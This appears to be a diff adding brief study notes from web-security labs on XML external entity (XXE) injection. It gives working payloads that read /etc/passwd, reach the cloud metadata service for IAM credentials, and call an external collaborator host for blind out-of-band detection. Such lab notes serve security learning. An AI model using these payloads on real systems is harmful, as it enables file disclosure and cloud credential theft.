@@ -1,0 +1,31 @@
+XXE
+
+
+any schema
+http://
+https://
+file://
+gopher://
+expect://
+
+
+so we cn get LFD  READONLY FILES
+
+
+ALSO SSRF
+
+RCE : from expect
+
+
+LAB 1 FILE READ 
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+
+LAB2 SSRF 
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+
+/latest/meta-data/iam/security-credentials/admin
+
+LAB3 OUT OF BAND AND BLIND
+
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://4689anseq0rm7xc5fy3jx85b92ft3jr8.oastify.com/test?lol=zz"> ]>
+
